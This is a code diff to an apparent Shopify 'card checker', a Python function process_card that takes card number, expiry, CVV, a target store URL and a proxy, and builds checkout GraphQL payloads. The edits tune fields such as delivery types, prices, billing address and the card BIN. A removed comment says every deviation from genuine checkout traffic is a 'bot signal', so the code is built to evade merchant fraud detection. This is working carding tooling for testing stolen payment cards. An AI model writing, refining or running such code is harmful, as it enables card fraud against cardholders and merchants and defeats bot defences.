@@ -1940,12 +1940,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         "options": {}
                     },
                     "targetMerchandiseLines": {"any": True},
-                    "deliveryMethodTypes": ["SHIPPING"],
+                    "deliveryMethodTypes": ["SHIPPING", "LOCAL"],
                     "expectedTotalPrice": {"any": True}, 
                     "destinationChanged": True
                 }],
                 "noDeliveryRequired": [], 
-                "useProgressiveRates": False,
+                "useProgressiveRates": True,
                 "prefetchShippingRatesStrategy": None, 
                 "supportsSplitShipping": True,
             }
@@ -1953,41 +1953,44 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             # ── Proposal variables
             # 🔥 FIX: For P1, do not send stableId, let Shopify figure it out.
             # Also send the exact merch GID.
-            # 🔥 CORE FIX: P1 payload aligned EXACTLY to the s4chiz/rukia engine —
-            # every deviation from the real checkout-web shape is a bot signal.
-            # (lean fields, concrete prices, minimal billing, no extra keys)
             proposal_variables = {
                 "sessionInput": {"sessionToken": sst},
                 "queueToken": queueToken or "",
+                "changesetTokens": [],
                 "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                 "delivery": initial_delivery,
                 "deliveryExpectations": {"deliveryExpectationLines": []},
                 "merchandise": {"merchandiseLines": [{
-                    "stableId": stableId or "1",
+                    "stableId": stableId, 
                     "merchandise": {"productVariantReference": {
                         "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                         "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                         "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                     "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"value": {"amount": variant_price_fallback or "0.01",
-                                                     "currencyCode": currency}},
+                    "expectedTotalPrice": {"any": True},
                     "lineComponentsSource": None, "lineComponents": []}]},
                 "payment": {
                     "totalAmount": {"any": True}, "paymentLines": [],
-                    "billingAddress": {"streetAddress": {
-                        "address1": "", "city": "", "countryCode": country_code,
-                        "lastName": "", "zoneCode": "ENG", "phone": ""}},
+                    "billingAddress": {"streetAddress": dict(billing_street)},
+                    "creditCardBin": _cc_bin(cc),
+                    "allowStoreCredit": False,
                 },
                 "buyerIdentity": {
                     "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                     "email": email, "emailChanged": False,
                     "phoneCountryCode": country_code,
-                    "marketingConsent": [{"email": {"value": email}}],
+                    "phone": phone,
+                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}],
+                    "messagingMarketingConsent": {
+                        "consentState": "DECLINED",
+                        "countryCode": country_code,
+                        "disclosureCountryCode": country_code,
+                    },
                     "shopPayOptInPhone": {"countryCode": country_code},
                     "rememberMe": False},
                 "tip": {"tipLines": []},
                 "taxes": {"proposedAllocations": None,
-                          "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
+                          "proposedTotalAmount": {"any": True},
                           "proposedTotalIncludedAmount": None,
                           "proposedMixedStateTotalAmount": None,
                           "proposedExemptions": []},
@@ -2154,7 +2157,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 delivery_line = {
                     "destination": {"streetAddress": dict(billing_street)},
                     "targetMerchandiseLines": _delivery_target(negotiated_stable_id),
-                    "deliveryMethodTypes": ["SHIPPING"],
+                    "deliveryMethodTypes": ["SHIPPING", "LOCAL"],
                     "expectedTotalPrice": {"any": True},
                     "destinationChanged": True
                 }
